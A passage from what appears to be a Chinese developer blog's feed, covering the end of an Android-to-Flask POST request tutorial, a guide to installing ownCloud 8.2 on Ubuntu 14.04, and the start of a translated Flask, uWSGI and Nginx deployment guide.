String&gt; params = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">            String post_result = <span class="keyword">null</span>;</span><br><span class="line">            params.put(<span class="string">"uid"</span>, <span class="string">"001"</span>);</span><br><span class="line">            params.put(<span class="string">"name"</span>, <span class="string">"g2ex"</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                post_result = HttpUtils.submitPostData(params, <span class="string">"utf-8"</span>);</span><br><span class="line">                Log.i(<span class="string">"POST_RESULT"</span>, post_result);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>HttpUtils</code>类有三个静态方法：</p><ul><li><code>submitPostData()</code>方法发送POST请求到服务器并返回服务器信息</li><li><code>getRequestData()</code>方法用于封装请求体</li><li><code>dealResponseResult()</code>方法处理服务器的响应结果</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HttpUtils.java */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpUtils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">submitPostData</span><span class="params">(Map&lt;String, String&gt; params, String encode)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 发送POST请求到服务器并返回服务器信息</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> params 请求体内容</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> encode 编码格式</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> 服务器返回信息</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">byte</span>[] data = getRequestData(params, encode).toString().getBytes();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://10.10.10.128:5000/"</span>);</span><br><span class="line">        HttpURLConnection httpURLConnection = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            httpURLConnection = (HttpURLConnection)url.openConnection();</span><br><span class="line">            httpURLConnection.setConnectTimeout(<span class="number">3000</span>);  <span class="comment">// 设置连接超时时间</span></span><br><span class="line">            httpURLConnection.setDoInput(<span class="keyword">true</span>);         <span class="comment">// 打开输入流，以便从服务器获取数据</span></span><br><span class="line">            httpURLConnection.setDoOutput(<span class="keyword">true</span>);        <span class="comment">// 打开输出流，以便向服务器提交数据</span></span><br><span class="line">            httpURLConnection.setRequestMethod(<span class="string">"POST"</span>); <span class="comment">// 设置以POST方式提交数据</span></span><br><span class="line">            httpURLConnection.setUseCaches(<span class="keyword">false</span>);      <span class="comment">// 使用POST方式不能使用缓存</span></span><br><span class="line">            <span class="comment">// 设置请求体的类型是文本类型</span></span><br><span class="line">            httpURLConnection.setRequestProperty(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">            <span class="comment">// 设置请求体的长度</span></span><br><span class="line">            httpURLConnection.setRequestProperty(<span class="string">"Content-Length"</span>, String.valueOf(data.length));</span><br><span class="line">            <span class="comment">// 获得输入流，向服务器写入数据</span></span><br><span class="line">            OutputStream outputStream = <span class="keyword">new</span> BufferedOutputStream(httpURLConnection.getOutputStream());</span><br><span class="line">            outputStream.write(data);</span><br><span class="line">            outputStream.flush();                       <span class="comment">// 重要！flush()之后才会写入</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> response = httpURLConnection.getResponseCode();     <span class="comment">// 获得服务器响应码</span></span><br><span class="line">            <span class="keyword">if</span> (response == HttpURLConnection.HTTP_OK) &#123;</span><br><span class="line">                InputStream inputStream = httpURLConnection.getInputStream();</span><br><span class="line">                <span class="keyword">return</span> dealResponseResult(inputStream);             <span class="comment">// 处理服务器响应结果</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            httpURLConnection.disconnect();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 封装请求体信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> params 请求体内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> encode 编码格式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 请求体信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> StringBuffer <span class="title">getRequestData</span><span class="params">(Map&lt;String, String&gt; params, String encode)</span> </span>&#123;</span><br><span class="line">        StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();            <span class="comment">//存储封装好的请求体信息</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                stringBuffer.append(entry.getKey())</span><br><span class="line">                        .append(<span class="string">"="</span>)</span><br><span class="line">                        .append(URLEncoder.encode(entry.getValue(), encode))</span><br><span class="line">                        .append(<span class="string">"&amp;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            stringBuffer.deleteCharAt(stringBuffer.length() - <span class="number">1</span>);   <span class="comment">// 删除最后一个"&amp;"</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理服务器的响应结果（将输入流转换成字符串)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inputStream 服务器的响应输入流</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 服务器响应结果字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">dealResponseResult</span><span class="params">(InputStream inputStream)</span> </span>&#123;</span><br><span class="line">        String resultData = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(data)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(data, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        resultData = <span class="keyword">new</span> String(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> resultData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，记得在<code>AndroidManifest.xml</code>中加入网络权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>运行应用，在Android Studio logcat中可以看到输出的日志<code>I/POST_RESULT: OK.</code>，服务器终端中也可以看到打印的内容和访问记录。</p><blockquote><p>源码下载：<a href="http://pan.baidu.com/s/13G7LW" target="_blank" rel="noopener">http://pan.baidu.com/s/13G7LW</a> 密码: 4ww5</p></blockquote><h2 id="四、参考内容"><a href="#四、参考内容" class="headerlink" title="四、参考内容"></a>四、参考内容</h2><ol><li><a href="http://docs.jinkan.org/docs/flask/" target="_blank" rel="noopener">http://docs.jinkan.org/docs/flask/</a> 《Flask中文开发文档》</li><li><a href="http://www.cnblogs.com/menlsh/archive/2013/05/22/3091983.html" target="_blank" rel="noopener">http://www.cnblogs.com/menlsh/archive/2013/05/22/3091983.html</a> 《Android学习笔记46：使用Post方式提交数据》。本文中的<code>HttpUtils</code>引用自该文章，文章中服务器端使用的是Apache Tomcat。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、说明&quot;&gt;&lt;a href=&quot;#一、说明&quot; class=&quot;headerlink&quot; title=&quot;一、说明&quot;&gt;&lt;/a&gt;一、说明&lt;/h2&gt;&lt;p&gt;在Android开发中，当应用需要向服务器提交数据数据时，可以使用POST方式向服务器提交form表单。服务器端框架有多种选
      
    
    </summary>
    
    
      <category term="Android" scheme="https://g2ex.top/tags/Android/"/>
    
      <category term="Python" scheme="https://g2ex.top/tags/Python/"/>
    
      <category term="Flask" scheme="https://g2ex.top/tags/Flask/"/>
    
      <category term="POST" scheme="https://g2ex.top/tags/POST/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 14.04部署ownCloud 8.2</title>
    <link href="https://g2ex.top/2015/11/08/Install-ownCloud-8-2-on-Ubuntu-14-04/"/>
    <id>https://g2ex.top/2015/11/08/Install-ownCloud-8-2-on-Ubuntu-14-04/</id>
    <published>2015-11-08T23:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>为了更好地用户体验，<a href="https://owncloud.org/blog/owncloud-server-8-1-will-not-support-windows-as-server-platform-natively/" title="ownCloud Server 8.1 Will Not Support Windows as Server Platform Natively" target="_blank" rel="noopener">ownCloud从8.1版本开始不再把Windows列入原生支持的平台</a>。因此，最好在类Linux平台上部署ownCloud的服务器端。</p><p>ownCloud服务器端使用PHP编写，因此部署ownCloud需要Apache、MySQL/MariaDB（也支持SQLite、PostgreSQL或Oracle）、PHP的环境。类似我们搭建一个PHP Blog或CMS，可以从<a href="https://www.apachefriends.org/" title="Apache Friendslatform Natively" target="_blank" rel="noopener">Apache Friends</a>下载一套XAMPP快速安装，也可以按照本文中从Ubuntu软件源中单独安装Apache、MySQL和PHP，配置好环境后再安装ownCloud。</p><p>结合参考官网文档，在Ubuntu 14.04上部署ownCloud 8.2的步骤如下。</p><h2 id="一、安装apapche2"><a href="#一、安装apapche2" class="headerlink" title="一、安装apapche2"></a>一、安装apapche2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure><h2 id="二、安装PHP"><a href="#二、安装PHP" class="headerlink" title="二、安装PHP"></a>二、安装PHP</h2><h3 id="1-安装PHP"><a href="#1-安装PHP" class="headerlink" title="1) 安装PHP"></a>1) 安装PHP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php5 php5-mysql</span><br></pre></td></tr></table></figure><h3 id="2-安装ownCloud所需模块"><a href="#2-安装ownCloud所需模块" class="headerlink" title="2) 安装ownCloud所需模块"></a>2) 安装ownCloud所需模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php5-gd php5-json php5-curl php5-intl php5-mcrypt php5-imagick</span><br></pre></td></tr></table></figure><h2 id="三、安装MySQL"><a href="#三、安装MySQL" class="headerlink" title="三、安装MySQL"></a>三、安装MySQL</h2><h3 id="1-安装MySQL服务端"><a href="#1-安装MySQL服务端" class="headerlink" title="1) 安装MySQL服务端"></a>1) 安装MySQL服务端</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mysql-server</span><br></pre></td></tr></table></figure><h3 id="2-安全配置MySQL"><a href="#2-安全配置MySQL" class="headerlink" title="2) 安全配置MySQL"></a>2) 安全配置MySQL</h3><p>MySQL的默认配置并不安全，因此需要使用<code>mysql_secure_installation</code>脚本对MySQL进行安全配置。配置项包括设置root密码（在安装MySQL时应该已经设置）、移除匿名用户、禁止远程root登录、移除test数据库和访问权限，最后重载授权表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql_secure_installation</span><br></pre></td></tr></table></figure><h3 id="3-创建ownCloud数据库"><a href="#3-创建ownCloud数据库" class="headerlink" title="3) 创建ownCloud数据库"></a>3) 创建ownCloud数据库</h3><p>下面命令中为ownCloud创建的用户<code>ownclouduser</code>和密码以及数据库<code>ownclouddb</code>会在之后首次配置ownCloud时使用。你也可以使用其他名字。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mysql -u root -p</span></span><br><span class="line">Enter password:</span><br><span class="line"></span><br><span class="line">mysql&gt; CREATE USER <span class="string">'ownclouduser'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'YOURPASSWORD'</span>;</span><br><span class="line">mysql&gt; CREATE DATABASE ownclouddb;</span><br><span class="line">mysql&gt; GRANT ALL ON ownclouddb.* TO <span class="string">'ownclouduser'</span>@<span class="string">'localhost'</span>;</span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br><span class="line">mysql&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="四、安装ownCloud-8"><a href="#四、安装ownCloud-8" class="headerlink" title="四、安装ownCloud 8"></a>四、安装ownCloud 8</h2><p>ownCloud官方介绍了<a href="https://owncloud.org/install/#instructions-server" title="部署ownCloud" target="_blank" rel="noopener">4种</a>针对不同环境安装ownCloud的方法：</p><ul><li>Archive File —— For server owners</li><li>&lt;/&gt; Web Installer —— For Shared hosts</li><li>Packages —— For auto updates</li><li>Applications —— For easy deployment</li></ul><p>为了方便自动更新，本文使用<code>Packages</code>的方法安装ownCloud服务器端，该方法非常简单。</p><h3 id="1-下载ownCloud公钥"><a href="#1-下载ownCloud公钥" class="headerlink" title="1) 下载ownCloud公钥"></a>1) 下载ownCloud公钥</h3><p>下载针对<code>xUbuntu 14.04</code>的<code>ownCloud公钥</code>到我们本地的可信任列表中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -nv https://download.owncloud.org/download/repositories/8.2/xUbuntu_14.04/Release.key -O Release.key</span><br><span class="line">sudo apt-key add - &lt; Release.key</span><br></pre></td></tr></table></figure><h3 id="2-添加更新源安装ownCloud"><a href="#2-添加更新源安装ownCloud" class="headerlink" title="2) 添加更新源安装ownCloud"></a>2) 添加更新源安装ownCloud</h3><p>添加ownCloud仓库到Ubuntu更新源中，更新软件包列表后安装ownCloud：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">"echo 'deb http://download.owncloud.org/download/repositories/8.2/xUbuntu_14.04/ /' &gt;&gt; /etc/apt/sources.list.d/owncloud.list"</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install owncloud</span><br></pre></td></tr></table></figure><h3 id="3-配置ownCloud"><a href="#3-配置ownCloud" class="headerlink" title="3) 配置ownCloud"></a>3) 配置ownCloud</h3><p>现在，在浏览器中输入<code>http://localhost/owncloud</code>后应该可以看到ownCloud初始化配置界面了。创建一个管理员账户，数据库选择<code>MySQL/MariaDB</code>，分别输入在第三节中创建的ownCloud<code>数据库用户</code>、<code>密码</code>和<code>数据库名称</code>，点击<code>Finish setup</code>进入管理员页面。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-11-08_211715.webp" alt="初始化配置ownCloud" title="初始化配置ownCloud"></p><p>至此，ownCloud安装和初始化配置已经全部完成。</p><p>接下来，你可以根据需要修改ownCloud的设置，比如启用HTTPS、启用服务器文件加密（需先点击左上角<code>Files</code>-&gt;<code>Apps</code>-&gt;<code>Not enabled</code>，启用<code>Default encryption module</code>）等等。</p><p>ownCloud默认没有启用文件加密，<code>root</code>用户可以在<code>/var/www/owncloud/data/用户名/files</code>目录下查看用户的文件——未加密的明文文件！</p><h2 id="五、参考内容"><a href="#五、参考内容" class="headerlink" title="五、参考内容"></a>五、参考内容</h2><ol><li><a href="http://idroot.net/tutorials/install-owncloud-8-ubuntu-14-04/" target="_blank" rel="noopener">http://idroot.net/tutorials/install-owncloud-8-ubuntu-14-04/</a></li><li><a href="https://download.owncloud.org/download/repositories/stable/owncloud/" target="_blank" rel="noopener">https://download.owncloud.org/download/repositories/stable/owncloud/</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;为了更好地用户体验，&lt;a href=&quot;https://owncloud.org/blog/owncloud-server-8-1-will-not-support-windows-as-server-platform-natively/&quot; title=&quot;ownCloud S
      
    
    </summary>
    
    
      <category term="Apache" scheme="https://g2ex.top/tags/Apache/"/>
    
      <category term="MySQL" scheme="https://g2ex.top/tags/MySQL/"/>
    
      <category term="Ubuntu" scheme="https://g2ex.top/tags/Ubuntu/"/>
    
      <category term="ownCloud" scheme="https://g2ex.top/tags/ownCloud/"/>
    
      <category term="PHP" scheme="https://g2ex.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>[译]如何在Ubuntu 14.04中为Flask应用部署Nginx和uWSGI服务</title>
    <link href="https://g2ex.top/2015/10/30/How-to-Serve-Flask-Applications-with-uWSGI-and-Nginx-on-Ubuntu-14-04/"/>
    <id>https://g2ex.top/2015/10/30/How-to-Serve-Flask-Applications-with-uWSGI-and-Nginx-on-Ubuntu-14-04/</id>
    <published>2015-10-30T20:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>英文链接：<a href="https://www.digitalocean.com/community/tutorials/how-to-serve-flask-applications-with-uwsgi-and-nginx-on-ubuntu-14-04" target="_blank" rel="noopener">https://www.digitalocean.com/community/tutorials/how-to-serve-flask-applications-with-uwsgi-and-nginx-on-ubuntu-14-04</a></p><p>中文由G2EX.ME作者翻译，转载请注明本文链接。</p><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>本指南中，我们在Ubuntu 14.04中使用微框架Flask搭建一个简单的Python应用。文中的大部分内容是介绍如何部署uWSGI服务来启动应用，以及如何部署Nginx作为前端到后端的反向代理。</p><h2 id="二、预备条件"><a href="#二、预备条件" class="headerlink" title="二、预备条件"></a>二、预备条件</h2><p>本指南开始之前，在服务器中你应该会有一个非root用户。为了能执行管理员的功能，这个用户需要<code>sudo</code>权限。了解如何设置用户和管理员权限，请阅读《<a href="https://www.digitalocean.com/community/tutorials/initial-server-setup-with-ubuntu-14-04" title="initial server setup guide" target="_blank" rel="noopener">initial server setup guide</a>》。</p><p>想更多了解应用服务uWSGI和WSGI规范，你可以阅读<a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-uwsgi-and-nginx-to-serve-python-apps-on-ubuntu-14-04#definitions-and-concepts" title="How To Set Up uWSGI and Nginx to Serve Python Apps on Ubuntu 14.04" target="_blank" rel="noopener">这个指南中的章节</a>。理解这些概念后能够让你更容易地阅读这个指南。</p><p>当你准备好后，开始阅读下文。</p><h2 id="三、从Ubuntu仓库中安装组件"><a href="#三、从Ubuntu仓库中安装组件" class="headerlink" title="三、从Ubuntu仓库中安装组件"></a>三、从Ubuntu仓库中安装组件</h2><p>我们第一步是要从仓库中安装所需的组件。包括Python包管理器<code>pip</code>，它可以安装和管理Python组件。我们也会安装构建uWSGI所需的Python开发文件，以及安装Nginx。</p><p>更新你本地软件包的索引，然后输入以下命令安装软件包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install python-pip python-dev nginx</span><br></pre></td></tr></table></figure><h2 id="四、创建Python虚拟环境"><a href="#四、创建Python虚拟环境" class="headerlink" title="四、创建Python虚拟环境"></a>四、创建Python虚拟环境</h2><p>接下来，为了把Flask应用与系统上其他Python应用隔离开来，我们要创建一个虚拟环境。</p><p>使用<code>pip</code>安装<code>virtualenv</code>软件包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install virtualenv</span><br></pre></td></tr></table></figure><p>现在，我们为Flask项目创建一个父目录。创建后进入该目录中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/myproject</span><br><span class="line"><span class="built_in">cd</span> ~/myproject</span><br></pre></td></tr></table></figure><p>输入下面的命令，我们可以创建一个虚拟环境，用以存储Flask项目所需的Python条件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv myprojectenv</span><br></pre></td></tr></table></figure><p>这会在你的项目目录中创建一个<code>myprojectenv</code>文件夹，该文件夹中安装了一份Python和<code>pip</code>的本地拷贝。</p><p>在这个虚拟环境中安装应用之前，我们需要激活它。输入下面的命令来激活这个虚拟环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> myprojectenv/bin/activate</span><br></pre></td></tr></table></figure><p>你的终端中会显示你现在已经处于这个虚拟环境中了，类似<code>(myprojectenv)user@host:~/myproject$</code>。</p><h2 id="五、创建Flask应用"><a href="#五、创建Flask应用" class="headerlink" title="五、创建Flask应用"></a>五、创建Flask应用</h2><p>现在你已经处于虚拟环境中了，我们可以安装Flask和uWSGI，并开始设计我们的应用：</p><h3 id="1-安装Flask和uWSGI"><a href="#1-安装Flask和uWSGI" class="headerlink" title="1) 安装Flask和uWSGI"></a>1) 安装Flask和uWSGI</h3><p>我们可以使用<code>pip</code>的本地实例来安装Flask和uWSGI。输入下面的命令安装这两个组件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uwsgi flask</span><br></pre></td></tr></table></figure><h3 id="2-创建示例App"><a href="#2-创建示例App" class="headerlink" title="2) 创建示例App"></a>2) 创建示例App</h3><p>现在我们已经安装了Flask，可以创一个简单的应用了。Flask是一个微框架。它可能没有一些其他完整特性框架的工具，并主要以模块的形式存在，你可以把它导入到你的项目中帮助你初始化一个Web应用。</p><p>当应用比较复杂的时候，我们可以在一个单文件中创建Flask App，我们把这个文件命名为<code>myproject.py</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano ~/myproject/myproject.py</span><br></pre></td></tr></table></figure><p>我们在这个文件中编写应用的代码。主要地，我们需要导入flask并实例化一个Flask对象。我们使用这个对象来定义功能，当特定的路由被请求时执行这些功能。在代码中，我们把Flask应用称为<code>application</code>，这与WSGI规范的示例一样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">application = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@application.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;h1 style='color:blue'&gt;Hello There!&lt;/h1&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    application.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>这主要定义了当访问根域名时要显示哪些内容。编辑完成后，保存并关闭这个文件。</p><p>输入下面的命令，可以测试你的Flask应用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python myproject.py</span><br></pre></td></tr></table></figure><p>在浏览器中输入你的服务器域名或者IP地址并附加上端口号，端口号可以在终端的输出中看到（大部分显示<code>:5000</code>）。你应该看到这样的内容：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-28_000000_test_app.webp" alt="显示内容" title="显示内容"></p><p>执行完毕后，在终端中使用<code>CTRL-C</code>组合键停止Flask服务。</p><h3 id="3-创建WSGI入口点"><a href="#3-创建WSGI入口点" class="headerlink" title="3) 创建WSGI入口点"></a>3) 创建WSGI入口点</h3><p>接下来，我们创建一个文件，作为我们应用的入口点。该文件告诉uWSGI服务器如何与应用交互。</p><p>我们把这个文件命名为<code>wsgi.py</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano ~/myproject/wsgi.py</span><br></pre></td></tr></table></figure><p>该文件非常简单，我们可以从应用中简单地导入Flask实例并运行它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> myproject <span class="keyword">import</span> application</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    application.run()</span><br></pre></td></tr></table></figure><p>编辑完成后，保存并关闭该文件。</p><h2 id="六、配置uWSGI"><a href="#六、配置uWSGI" class="headerlink" title="六、配置uWSGI"></a>六、配置uWSGI</h2><p>我们的应用已经完成并且建立了入口点。现在，让我们把目光转移到uWSGI。</p><h3 id="1-测试uWSGI服务"><a href="#1-测试uWSGI服务" class="headerlink" title="1) 测试uWSGI服务"></a>1) 测试uWSGI服务</h3><p>首先我们要测试一下，保证uSWGI能够为我们的应用提供服务。</p><p>我们可以通过简单地传递入口点的名称来进行测试。同时，也要指定socket，这样它可以用公开可用的接口和协议来启动，启动时使用HTTP协议而不是<code>uwsgi</code>二进制协议：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --socket 0.0.0.0:8000 --protocol=http -w wsgi</span><br></pre></td></tr></table></figure><p>如果使用浏览器访问你的服务器域名或者IP地址并附加上端口号<code>:8000</code>，你可以在浏览器中看到下面的内容：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-10-28_000000_test_app.webp" alt="显示内容" title="显示内容"></p><p>确认它能正确运行后，在终端中按<code>CTRL-C</code>组合键退出uWSGI服务。</p><p>现在我们已经用完了虚拟环境，可以关闭它了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><p>所有有关系统的Python环境的操作至此已经完成了。</p><h3 id="2-创建uWSGI配置文件"><a href="#2-创建uWSGI配置文件" class="headerlink" title="2) 创建uWSGI配置文件"></a>2) 